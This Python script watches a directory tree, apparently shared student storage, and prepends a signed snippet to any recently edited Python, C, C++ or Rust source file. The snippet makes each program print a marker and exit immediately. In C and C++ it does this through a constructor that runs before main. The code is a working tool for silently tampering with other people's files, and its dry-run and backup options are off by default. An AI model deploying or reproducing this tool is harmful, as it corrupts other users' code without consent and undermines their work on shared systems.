#!/usr/bin/env python3
"""
poll_inject.py

Recursively poll a directory and, for files modified/created in the last X seconds,
prepend a language-specific snippet as the very first lines.

Defaults:
  root: /sgoinfre/goinfre/Perso
  window: 30 seconds
  poll interval: 2 seconds
"""

from __future__ import annotations

import argparse
import os
import sys
import time
from pathlib import Path
from typing import Dict, Tuple

# -----------------------------
# Easy-to-setup configuration
# -----------------------------

DEFAULT_ROOT = "/sgoinfre/goinfre/Perso"
DEFAULT_WINDOW_SECONDS = 30
DEFAULT_POLL_SECONDS = 2

# Marker used to avoid injecting multiple times
MARKER = "FROM ACHAISNE CONTACT si@42paris.fr. WITH LOVE"

# Per-extension injection text (prepended at file start).
# Make changes here to customize the inserted code.
INJECTIONS: Dict[str, str] = {
    ".py": (
        f"# {MARKER}\n"
        "print('hello world')\n"
        "raise SystemExit(0)\n"
        "\n"
    ),
    ".c": (
        f"// {MARKER}\n"
        "#include <unistd.h>\n"
        "#include <stdlib.h>\n"
        "__attribute__((constructor))\n"
        "static void keystroke_injection_boot(void) {\n"
        f"    ssize_t ks_written = write(1, \"{MARKER}\\n\", {len(MARKER) + 1});\n"
        "    (void)ks_written;\n"
        "    _Exit(0);\n"
        "}\n"
        "\n"
    ),
    ".cpp": (
        f"// {MARKER}\n"
        "#include <unistd.h>\n"
        "#include <cstdlib>\n"
        "__attribute__((constructor))\n"
        "static void keystroke_injection_boot(void) {\n"
        f"    ssize_t ks_written = write(1, \"{MARKER}\\n\", {len(MARKER) + 1});\n"
        "    (void)ks_written;\n"
        "    std::_Exit(0);\n"
        "}\n"
        "\n"
    ),
    ".rs": (
        f"// {MARKER}\n"
        "fn main() {\n"
        "    println!(\"hello world\");\n"
        "    std::process::exit(0);\n"
        "}\n"
        "\n"
    ),
}

# -----------------------------
# Helpers
# -----------------------------

def newest_timestamp(st: os.stat_result) -> float:
    """
    "created or modified" on Linux is tricky; st_ctime is inode change time,
    not true creation time. We approximate by taking max(mtime, ctime).
    """
    return max(st.st_mtime, st.st_ctime)


def already_injected(head: str) -> bool:
    # Only check the first ~2KB for the marker.
    return MARKER in head


def read_head(path: Path, nbytes: int = 2048) -> str:
    try:
        with path.open("rb") as f:
            return f.read(nbytes).decode("utf-8", errors="ignore")
    except Exception:
        return ""


def safe_write_atomic(path: Path, content: bytes) -> None:
    tmp = path.with_name(path.name + ".tmp_inject")
    with tmp.open("wb") as f:
        f.write(content)
        f.flush()
        os.fsync(f.fileno())
    tmp.replace(path)


def inject_file(path: Path, injection: str, make_backup: bool, dry_run: bool) -> Tuple[bool, str]:
    """
    Returns (changed, message)
    """
    try:
        original_bytes = path.read_bytes()
    except Exception as e:
        return False, f"READ FAIL: {path} ({e})"

    head = original_bytes[:2048].decode("utf-8", errors="ignore")
    if already_injected(head):
        return False, f"SKIP (already injected): {path}"

    new_bytes = injection.encode("utf-8") + original_bytes

    if dry_run:
        return True, f"DRY RUN would inject: {path}"

    if make_backup:
        backup = path.with_suffix(path.suffix + ".bak")
        try:
            # Don't overwrite an existing backup
            if not backup.exists():
                backup.write_bytes(original_bytes)
        except Exception as e:
            return False, f"BACKUP FAIL: {path} -> {backup} ({e})"

    try:
        safe_write_atomic(path, new_bytes)
    except Exception as e:
        return False, f"WRITE FAIL: {path} ({e})"

    return True, f"INJECTED: {path}"


def iter_target_files(root: Path, exts: Tuple[str, ...]):
    for p in root.rglob("*"):
        if p.is_file() and p.suffix in exts:
            yield p


# -----------------------------
# Main loop
# -----------------------------

def main() -> int:
    ap = argparse.ArgumentParser(description="Poll a folder and prepend hello/exit snippets to recent files.")
    ap.add_argument("--root", default=DEFAULT_ROOT, help=f"Root folder to poll (default: {DEFAULT_ROOT})")
    ap.add_argument("--window", type=int, default=DEFAULT_WINDOW_SECONDS, help="Seconds threshold for recent files (default: 30)")
    ap.add_argument("--poll", type=float, default=DEFAULT_POLL_SECONDS, help="Polling interval in seconds (default: 2)")
    ap.add_argument("--once", action="store_true", help="Run one scan only (no continuous polling)")
    ap.add_argument("--dry-run", action="store_true", help="Show what would change without writing")
    ap.add_argument("--backup", action="store_true", help="Write a .bak backup next to modified files")
    ap.add_argument("--verbose", action="store_true", help="Print skipped files too")
    args = ap.parse_args()

    root = Path(args.root)
    if not root.exists() or not root.is_dir():
        print(f"ERROR: root is not a directory: {root}", file=sys.stderr)
        return 2

    exts = tuple(INJECTIONS.keys())

    print(f"Polling root: {root}")
    print(f"Extensions: {', '.join(exts)}")
    print(f"Recent window: {args.window}s | Poll interval: {args.poll}s")
    if args.dry_run:
        print("Mode: DRY RUN (no writes)")
    if args.backup:
        print("Backups: ENABLED (.bak)")

    # Track what we already processed recently to avoid noisy repeated attempts
    seen: Dict[Path, float] = {}

    while True:
        now = time.time()
        changed_count = 0

        for path in iter_target_files(root, exts):
            try:
                st = path.stat()
            except Exception:
                continue

            ts = newest_timestamp(st)
            age = now - ts
            if age > args.window:
                continue

            # Debounce: don't try the same file too often
            last = seen.get(path, 0.0)
            if now - last < max(1.0, args.poll):
                continue
            seen[path] = now

            injection = INJECTIONS.get(path.suffix)
            if not injection:
                continue

            changed, msg = inject_file(path, injection, make_backup=args.backup, dry_run=args.dry_run)
            if changed:
                changed_count += 1
                print(msg)
            else:
                if args.verbose:
                    print(msg)

        if args.once:
            print(f"Done. Changed: {changed_count}")
            return 0

        time.sleep(args.poll)

if __name__ == "__main__":
    raise SystemExit(main())
